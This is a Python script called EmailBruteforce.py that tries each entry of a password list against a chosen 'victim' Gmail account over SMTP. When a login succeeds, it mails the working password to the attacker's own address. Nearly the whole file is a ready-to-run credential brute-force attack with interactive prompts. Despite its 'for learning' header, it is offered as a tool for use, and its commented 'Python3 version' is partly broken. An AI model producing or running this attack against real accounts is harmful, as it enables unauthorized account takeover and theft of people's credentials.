# EmailBruteforce.py

#Copyright of ParzifalKali(Tommaso De Ponti). Do NOT copy it as yours. This code is only to learn the python cybersecurity.


# Some imports

import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
import sys

# End of imports

# Creating our title

def title_setup():
    title = os.system("figlet Email Bruteforce")
    print(title)

title_setup()

# End of title_setup function

# Definiting the sendmail function

def send_without_attachments(email, password, recipient, subject, message):
    msg = MIMEMultipart()
    msg["From"] = email
    msg["To"] = recipient
    msg["Subject"] = subject

    msg.attach(MIMEText(message, "plain"))

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    text = msg.as_string()
    server.sendmail(email, recipient, text)
    server.quit()

# End of sendmail function

if __name__ == "__main__":

    # Python2 version :

    email_to_attack = raw_input("Enter your victim email : >> ")
    password_list_input = raw_input("Enter the path of your password list : >> ")
    password_list = open(password_list_input, "r")
    your_email = raw_input("Enter your mail : >> ")

    choice = raw_input("Start the attack : (Y or N) >> ")
    confirmation = "Y"
    negation = "N"
    print "Remember : when the program is executingn watch your eamil, and if the bruteforce worked you will recive a mail with the password"
    if choice == confirmation:
        for password in password_list:
            try:
                print(password)
                subj_message = "{} password".format(email_to_attack)
                send_without_attachments(email_to_attack, password, your_email, subj_message, message=password)
            except:
                pass
    if choice == negation:
        print("Error : KeyboardInterrupt")
        sys.exit()

    else :
        print("Command not found : Exiting ...")
        sys.exit()

    # Python3 version :

    #email_to_attack = input("Enter your victim email : >> ")
    #password_list_input = input("Enter the path of your password list : >> ")
    #password_list = open(password_list_input, "r")
    #your_email = input("Enter your mail : >> ")

    #choice = input("Start the attack : (Y or N) >> ")
    #confirmation = "Y"
    #negation = "N"
    #print "Remember : when the program is executingn watch your eamil, and if the bruteforce worked you will recive a mail with the password"
    #if choice == confirmation:
        #for password in password_list:
            #try:
                #print(password)
                #subj_message = "{} password".format(email_to_attack)
                #send_without_attachments(email_to_attack, password, your_email, subj_message, message=password)
            #except:
                #pass
    #if choice == negation:
        #print("Error : KeyboardInterrupt")
        #sys.exit()

    #else :
        #print("Command not found : Exiting ...")
        #sys.exit()


# End of the code